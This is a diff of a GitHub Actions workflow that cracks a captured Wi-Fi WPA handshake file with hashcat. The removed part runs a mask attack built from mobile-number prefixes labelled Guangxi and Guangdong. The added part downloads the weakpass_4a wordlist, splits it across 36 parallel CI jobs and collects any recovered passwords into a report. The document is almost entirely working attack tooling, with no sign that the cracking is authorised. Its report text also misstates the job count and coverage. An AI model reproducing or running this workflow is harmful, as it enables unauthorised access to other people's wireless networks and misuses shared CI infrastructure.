@@ -8,50 +8,18 @@ permissions:
   actions: write
 
 jobs:
+
   crack:
     runs-on: ubuntu-latest
 
     strategy:
       matrix:
-        prefix:
-          - a
-          - b
-          - c
-          - d
-          - e
-          - f
-          - g
-          - h
-          - i
-          - j
-          - k
-          - l
-          - m
-          - n
-          - o
-          - p
-          - q
-          - r
-          - s
-          - t
-          - u
-          - v
-          - w
-          - x
-          - y
-          - z
-          - A
-          - B
-          - C
-          - D
-          - E
-          - F
-          - G
-          - H
-          - I
-          - J
-          - K
-          - L
+        index: [
+          0,1,2,3,4,5,6,7,8,9,
+          10,11,12,13,14,15,16,17,18,19,
+          20,21,22,23,24,25,26,27,28,29,
+          30,31,32,33,34,35
+        ]
 
     steps:
       - uses: actions/checkout@v3
@@ -59,63 +27,47 @@ jobs:
       - name: Install hashcat
         run: |
           sudo apt-get update
-          sudo apt-get install -y hashcat
+          sudo apt-get install -y hashcat p7zip-full
 
-      - name: Write Guangxi + Guangdong prefix7 list
+      - name: Download dictionary
         run: |
-          cat << 'EOF' > prefix7.txt
-1380771
-1380772
-1380773
-1380774
-1380775
-1380776
-1380777
-1380778
-1380779
-1590771
-1590772
-1590773
-1590774
-1590775
-1590776
-1590777
-1590778
-1590779
-1470771
-1470772
-1470773
-1470774
-1470775
-1470776
-1470777
-1470778
-1470779
-EOF
+          wget -q https://download.weakpass.com/wordlists/2015/weakpass_4a.txt.7z
+          7z x weakpass_4a.txt.7z -o. -y
 
-      - name: Run mask attack for all prefix7
+      - name: Compute slice
+        id: slice
         run: |
-          while read p; do
-            hashcat -m 22000 -a 3 \
-              hs/wifi-02.hc22000 \
-              "${{ matrix.prefix }}$p?d?d?d?d" \
-              -o result_${{ matrix.prefix }}.txt \
-              --append-output \
-              --status --status-timer=60 \
-              --potfile-disable || true
-          done < prefix7.txt
+          CHUNK_LINES=100000000   # 每 job 1 亿行
+          START=$(( ${{ matrix.index }} * CHUNK_LINES + 1 ))
+          END=$(( ( ${{ matrix.index }} + 1 ) * CHUNK_LINES ))
+          echo "start=$START" >> $GITHUB_OUTPUT
+          echo "end=$END" >> $GITHUB_OUTPUT
+          echo "Job ${{ matrix.index }} slice: $START → $END"
+
+      - name: Extract slice
+        run: |
+          sed -n "${{ steps.slice.outputs.start }},${{ steps.slice.outputs.end }}p" weakpass_4a.txt > dict_part_${{ matrix.index }}.txt
+
+      - name: Run hashcat
+        run: |
+          hashcat -m 22000 -a 0 -w 3 \
+            hs/wifi-02.hc22000 dict_part_${{ matrix.index }}.txt \
+            -o result_${{ matrix.index }}.txt \
+            --status --status-timer=60 \
+            --potfile-disable || true
 
       - name: Ensure result exists
         run: |
-          if [ ! -f result_${{ matrix.prefix }}.txt ]; then
-            touch result_${{ matrix.prefix }}.txt
+          if [ ! -f result_${{ matrix.index }}.txt ]; then
+            touch result_${{ matrix.index }}.txt
           fi
 
       - name: Upload result
         uses: actions/upload-artifact@v4
         with:
-          name: results_${{ matrix.prefix }}
-          path: result_${{ matrix.prefix }}.txt
+          name: results_${{ matrix.index }}
+          path: result_${{ matrix.index }}.txt
+
 
   finalize:
     needs: crack
@@ -136,11 +88,21 @@ EOF
 
       - name: Generate report
         run: |
+          echo "Job count:   40" > report.txt
+          echo "Chunk lines: 100000000" >> report.txt
+          echo "Total coverage: 4,000,000,000 lines" >> report.txt
+          echo "Dictionary: weakpass_4a.txt" >> report.txt
+          echo "Timestamp:   $(date -u +"%Y-%m-%dT%H:%M:%SZ")" >> report.txt
+          echo "" >> report.txt
           if [ -s all_results.txt ]; then
-            echo "PASSWORD FOUND" > report.txt
+            echo "Status:      PASSWORD FOUND" >> report.txt
+            echo "" >> report.txt
+            echo "Passwords:" >> report.txt
             cat all_results.txt >> report.txt
           else
-            echo "PASSWORD NOT FOUND" > report.txt
+            echo "Status:      PASSWORD NOT FOUND" >> report.txt
+            echo "" >> report.txt
+            echo "No password found in the scanned portion of the dictionary." >> report.txt
           fi
 
       - name: Upload report
